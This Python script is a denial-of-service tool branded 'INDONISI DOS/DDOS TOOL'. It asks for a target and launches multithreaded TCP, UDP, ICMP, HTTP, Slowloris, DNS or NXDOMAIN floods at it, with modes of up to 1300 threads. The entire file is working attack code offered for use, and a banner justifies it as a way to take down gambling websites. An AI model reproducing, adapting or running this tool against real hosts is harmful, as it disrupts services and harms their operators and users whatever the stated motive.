import os
import sys
import subprocess
import socket
import threading
import time
import random
from termcolor import colored

def hacker_arka_plan():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;32;40m") 
    
    # ASCII Art 
    ascii_art = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """
    print(colored(ascii_art, "green", attrs=["bold"]))
    
   
    print(colored("="*40, "green", attrs=["bold"]))
    print(colored("      INDONISI DOS/DDOS TOOL          ", "yellow", attrs=["bold"]))
    print(colored("          Creator: PYSCODES       ", "cyan", attrs=["bold"]))
    print(colored("    Support : https://linktr.ee/pyscodes      ", "cyan", attrs=["bold"]))
    print(colored("    contact : https://instagram.com/pyscodes       ", "cyan", attrs=["bold"]))
    print(colored("="*40, "green", attrs=["bold"]))
    print(colored("   INDONISI Machine Gun Attack Tool   ", "cyan", attrs=["bold"]))
    print(colored("="*40, "green", attrs=["bold"]))
    print(colored("⚠  I DELIBERATELY MADE THIS TOOL TO ERADICATE ONLINE GAMBLING WEBSITES, OTHER THAN THAT I AM NOT RESPONSIBLE.⚠", "red", attrs=["bold"]))

def ping_kontrol(target_ip):
    try:
        response = subprocess.run(["ping", "-c", "1", target_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if response.returncode == 0:
            print(colored("Target is active", "green"))
            return True
        else:
            print(colored("Target is inactive", "red"))
            return False
    except Exception as e:
        print(colored(f"Ping operation failed: {e}", "red"))
        return False


class PaketDurumu:
    def __init__(self):
        self.sent = 0
        self.failed = 0
        self.lock = threading.Lock()

    def update(self, success):
        with self.lock:
            if success:
                self.sent += 1
            else:
                self.failed += 1

    def rate(self):
        total = self.sent + self.failed
        return (self.sent / total * 100) if total > 0 else 0


def tcp_flood(target_ip, target_port, status, sleep_time, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            status.update(True)
            sock.close()
            time.sleep(sleep_time)
        except Exception:
            status.update(False)


def udp_flood(target_ip, target_port, status, sleep_time, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = b"X" * random.randint(1024, 2048)
    while not stop_event.is_set():
        try:
            sock.sendto(message, (target_ip, target_port))
            status.update(True)
        except Exception:
            status.update(False)
        time.sleep(sleep_time)


def icmp_flood(target_ip, status, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.sendto(b"\x08\x00" + b"X" * 64, (target_ip, 0))
            status.update(True)
        except Exception:
            status.update(False)


def http_flood(target_ip, target_port, status, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(b"POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 10000\r\n\r\n" + b"X" * 10000)
            status.update(True)
            sock.close()
        except Exception:
            status.update(False)


def slowloris(target_ip, target_port, status, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\n")
            while not stop_event.is_set():
                sock.send(b"X-a: b\r\n")
                time.sleep(15)
            sock.close()
        except Exception:
            status.update(False)


def dns_flood(target_ip, status, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dns_request = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x05hello\x03com\x00\x00\x01\x00\x01"
            sock.sendto(dns_request, (target_ip, 53))
            status.update(True)
        except Exception:
            status.update(False)


def nxdomain_attack(target_ip, status, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            nxdomain_request = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03xyz\x05dummy\x03com\x00\x00\x01\x00\x01"
            sock.sendto(nxdomain_request, (target_ip, 53))
            status.update(True)
        except Exception:
            status.update(False)


def performans_izleme(status, stop_event):
    while not stop_event.is_set():
        print(colored(f"\rSent: {status.sent} | Failed: {status.failed} | Success Rate: {status.rate():.2f}%", "yellow"), end="")
        time.sleep(1)


mod_hizlari = {
    "1": (200, "Slow Mode"),
    "2": (500, "Normal Mode"),
    "3": (830, "Aggressive Mode"),
    "4": (1300, "Hardcore Mode")
}


def main():
    try:
        hacker_arka_plan() 
        while True:
            target_ip = input(colored("Enter Target IP/Domain: ", "yellow"))
            try:
                target_ip = socket.gethostbyname(target_ip)
                print(colored(f"Domain {target_ip} resolved successfully.", "green"))
                break
            except socket.gaierror:
                print(colored("Domain could not be resolved! Enter a valid domain or IP.", "red"))

        if not ping_kontrol(target_ip):
            print(colored("Operation terminated.", "red"))
            return

        print(colored("\n1) TCP Flood\n2) UDP Flood\n3) ICMP Flood\n4) HTTP Flood\n5) Slowloris Flood\n6) DNS Flood\n7) NXDOMAIN Attack", "cyan"))
        attack_type = input(colored("Select Attack Type (1/2/3/4/5/6/7): ", "yellow")).strip()
        
        print(colored("\n1) Slow Mode\n2) Normal Mode\n3) Aggressive Mode\n4) Hardcore Mode", "cyan"))
        mod_choice = input(colored("Select Mode (1/2/3/4): ", "yellow")).strip()
        if mod_choice in mod_hizlari:
            thread_count, mode_name = mod_hizlari[mod_choice]
            print(colored(f"Selected mode: {mode_name} ({thread_count} threads)", "cyan"))
        else:
            print(colored("Invalid mode selection!", "red"))

        status = PaketDurumu()
        stop_event = threading.Event()
        monitor_thread = threading.Thread(target=performans_izleme, args=(status, stop_event))
        monitor_thread.start()

        threads = []
        for _ in range(thread_count):
            if attack_type == "1":
                thread = threading.Thread(target=tcp_flood, args=(target_ip, 80, status, 0.01, stop_event))
            elif attack_type == "2":
                thread = threading.Thread(target=udp_flood, args=(target_ip, 80, status, 0.01, stop_event))
            elif attack_type == "3":
                thread = threading.Thread(target=icmp_flood, args=(target_ip, status, stop_event))
            elif attack_type == "4":
                thread = threading.Thread(target=http_flood, args=(target_ip, 80, status, stop_event))
            elif attack_type == "5":
                thread = threading.Thread(target=slowloris, args=(target_ip, 80, status, stop_event))
            elif attack_type == "6":
                thread = threading.Thread(target=dns_flood, args=(target_ip, status, stop_event))
            elif attack_type == "7":
                thread = threading.Thread(target=nxdomain_attack, args=(target_ip, status, stop_event))
            thread.start()
            threads.append(thread)

        print(colored("\nPress ESC to stop the attack and return to the main menu.", "red"))

        try:
            while True:
                if stop_event.is_set():
                    break
                time.sleep(0.1)
        except KeyboardInterrupt:
            stop_event.set()
            print(colored("\nAttack stopped. Returning to main menu...", "cyan"))

    except Exception as e:
        print(colored(f"An error occurred: {e}", "red"))

if __name__ == "__main__":
    main()
